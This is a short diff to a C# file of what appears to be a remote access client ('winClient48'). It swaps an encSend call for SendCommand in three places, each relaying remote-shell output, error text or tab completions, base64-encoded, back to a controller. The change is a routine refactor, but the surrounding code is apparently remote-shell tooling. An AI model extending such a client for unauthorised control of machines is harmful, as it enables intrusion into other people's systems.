@@ -93,7 +93,7 @@ namespace winClient48
                     while (bSendStdOutAndErr)
                     {
                         string line = sr_out.ReadLine();
-                        v.encSend(2, 0, "shell|output|" + clsCrypto.b64E2Str(Environment.NewLine + line));
+                        v.SendCommand("shell|output|" + clsCrypto.b64E2Str(Environment.NewLine + line));
 
                         if (cmd_sendPrompt)
                         {
@@ -111,7 +111,7 @@ namespace winClient48
                         try
                         {
                             string line = sr_err.ReadLine();
-                            v.encSend(2, 0, "shell|error|" + clsCrypto.b64E2Str(Environment.NewLine + line));
+                            v.SendCommand("shell|error|" + clsCrypto.b64E2Str(Environment.NewLine + line));
 
                             if (cmd_sendPrompt)
                             {
@@ -192,7 +192,7 @@ namespace winClient48
                 string sug = suggestion[idx_suggestion];
                 ls.Add(sug);
                 string line = string.Join(" ", ls.ToArray());
-                v.encSend(2, 0, "shell|tab|" + clsCrypto.b64E2Str(line));
+                v.SendCommand("shell|tab|" + clsCrypto.b64E2Str(line));
                 idx_suggestion++;
             }
             catch (Exception ex)
